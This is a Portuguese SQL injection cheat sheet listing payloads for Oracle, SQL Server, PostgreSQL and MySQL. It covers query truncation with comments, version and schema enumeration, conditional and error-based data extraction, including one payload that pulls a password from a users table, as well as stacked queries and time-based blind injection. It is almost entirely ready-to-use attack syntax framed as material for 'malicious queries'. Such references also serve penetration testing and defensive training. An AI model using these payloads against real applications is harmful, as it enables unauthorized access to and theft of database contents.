## SQL Injection Cheat Sheet em Diferentes Bancos de Dados

### 1. Concatenação de Strings

Você pode concatenar várias strings para formar uma única string.

- **Oracle**: `'foo'||'bar'`
- **Microsoft SQL Server**: `'foo'+'bar'`
- **PostgreSQL**: `'foo'||'bar'`
- **MySQL**: `'foo' 'bar'` *(Note o espaço entre as duas strings)* ou `CONCAT('foo','bar')`

### 2. Substring

Você pode extrair parte de uma string, a partir de um deslocamento especificado, com um comprimento especificado.

- **Oracle**: `SUBSTR('foobar', 4, 2)`
- **Microsoft SQL Server**: `SUBSTRING('foobar', 4, 2)`
- **PostgreSQL**: `SUBSTRING('foobar', 4, 2)`
- **MySQL**: `SUBSTRING('foobar', 4, 2)`

### 3. Comentários

Você pode usar comentários para truncar uma consulta e remover a parte da consulta original que segue sua entrada.

- **Oracle**: `--comentário`
- **Microsoft SQL Server**: `--comentário` ou `/*comentário*/`
- **PostgreSQL**: `--comentário` ou `/*comentário*/`
- **MySQL**: `#comentário`, `-- comentário` *(Note o espaço após o duplo traço)*, ou `/*comentário*/`

### 4. Obter Versão do Banco de Dados

Você pode consultar o banco de dados para determinar seu tipo e versão. Esta informação é útil ao formular ataques mais complexos.

- **Oracle**: 
  ```sql
  SELECT banner FROM v$version;
  SELECT version FROM v$instance;
  ```
- **Microsoft SQL Server**: 
  ```sql
  SELECT @@version;
  ```
- **PostgreSQL**: 
  ```sql
  SELECT version();
  ```
- **MySQL**: 
  ```sql
  SELECT @@version;
  ```

### 5. Listar Tabelas no Banco de Dados

Você pode listar as tabelas existentes no banco de dados usando a seguinte consulta:

- **Oracle**: 
  ```sql
  SELECT * FROM all_tables;
  ```
- **Microsoft SQL Server, PostgreSQL, MySQL**: 
  ```sql
  SELECT * FROM information_schema.tables;
  ```

### 6. Listar Colunas em uma Tabela

Você pode listar as colunas de uma tabela específica:

- **Oracle**: 
  ```sql
  SELECT * FROM all_tab_columns WHERE table_name = 'NOME-DA-TABELA';
  ```
- **Microsoft SQL Server, PostgreSQL, MySQL**: 
  ```sql
  SELECT * FROM information_schema.columns WHERE table_name = 'NOME-DA-TABELA';
  ```

### 7. Erros Condicionais

Você pode testar uma condição booleana única e acionar um erro no banco de dados se a condição for verdadeira.

- **Oracle**: 
  ```sql
  SELECT CASE WHEN (SUA-CONDICAO-AQUI) THEN TO_CHAR(1/0) ELSE NULL END FROM dual;
  ```
- **Microsoft SQL Server**: 
  ```sql
  SELECT CASE WHEN (SUA-CONDICAO-AQUI) THEN 1/0 ELSE NULL END;
  ```
- **PostgreSQL**: 
  ```sql
  1 = (SELECT CASE WHEN (SUA-CONDICAO-AQUI) THEN 1/(SELECT 0) ELSE NULL END);
  ```
- **MySQL**: 
  ```sql
  SELECT IF(SUA-CONDICAO-AQUI, (SELECT table_name FROM information_schema.tables), 'a');
  ```

### 8. Extração de Dados via Mensagens de Erro Visíveis

Você pode potencialmente provocar mensagens de erro que vazam dados sensíveis retornados pela sua consulta maliciosa.

- **Microsoft SQL Server**: 
  ```sql
  SELECT 'foo' WHERE 1 = (SELECT 'segredo');
  ```
  *Erro retornado:*
  ```
  > Conversion failed when converting the varchar value 'segredo' to data type int.
  ```

- **PostgreSQL**: 
  ```sql
  SELECT CAST((SELECT password FROM users LIMIT 1) AS int);
  ```
  *Erro retornado:*
  ```
  > invalid input syntax for integer: "segredo"
  ```

- **MySQL**: 
  ```sql
  SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'segredo')));
  ```
  *Erro retornado:*
  ```
  > XPATH syntax error: '\segredo'
  ```

### 9. Execução de Consultas Empilhadas

Você pode usar consultas empilhadas para executar várias consultas em sucessão. Esta técnica é principalmente útil em vulnerabilidades de SQL Injection "cegas".

- **Oracle**: Não suporta consultas empilhadas.
- **Microsoft SQL Server, PostgreSQL, MySQL**: 
  ```sql
  CONSULTA-1-AQUI; CONSULTA-2-AQUI;
  ```

### 10. Atrasos de Tempo

Você pode causar um atraso de tempo no banco de dados quando a consulta é processada. O seguinte causará um atraso incondicional de 10 segundos.

- **Oracle**: 
  ```sql
  dbms_pipe.receive_message(('a'),10);
  ```
- **Microsoft SQL Server**: 
  ```sql
  WAITFOR DELAY '0:0:10';
  ```
- **PostgreSQL**: 
  ```sql
  SELECT pg_sleep(10);
  ```
- **MySQL**: 
  ```sql
  SELECT SLEEP(10);
  ```

### 11. Atrasos Condicionais de Tempo

Você pode testar uma condição booleana e acionar um atraso de tempo se a condição for verdadeira.

- **Oracle**: 
  ```sql
  SELECT CASE WHEN (SUA-CONDICAO-AQUI) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual;
  ```
- **Microsoft SQL Server**: 
  ```sql
  IF (SUA-CONDICAO-AQUI) WAITFOR DELAY '0:0:10';
  ```
- **PostgreSQL**: 
  ```sql
  SELECT CASE WHEN (SUA-CONDICAO-AQUI) THEN pg_sleep(10) ELSE pg_sleep(0) END;
  ```
- **MySQL**: 
  ```sql
  SELECT IF(SUA-CONDICAO-AQUI,SLEEP(10),'a');
  ```